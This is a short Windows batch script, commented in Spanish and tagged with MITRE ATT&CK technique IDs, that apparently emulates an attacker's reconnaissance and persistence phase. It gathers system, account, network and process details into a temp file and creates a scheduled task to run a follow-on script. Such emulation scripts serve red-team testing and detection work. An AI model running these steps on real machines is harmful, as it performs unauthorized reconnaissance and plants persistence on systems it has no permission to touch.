@echo off
REM Fase 3 – Reconocimiento y persistencia
REM Técnicas: T1082, T1087, T1053.005

REM Información del sistema
systeminfo >> %TEMP%\fase3-recon.txt
whoami /all >> %TEMP%\fase3-recon.txt
ipconfig /all >> %TEMP%\fase3-recon.txt
arp -a >> %TEMP%\fase3-recon.txt
netstat -ano >> %TEMP%\fase3-recon.txt
route print >> %TEMP%\fase3-recon.txt

REM Comando para obtener usuarios
net user >> %TEMP%\fase3-recon.txt

REM Creación de tarea programada para persistencia
schtasks /create ^
  /sc once ^
  /tn "Fase3_T1053_Persist" ^
  /tr "%TEMP%\fase3-recon-persist.cmd" ^
  /st 23:59 ^
  /f
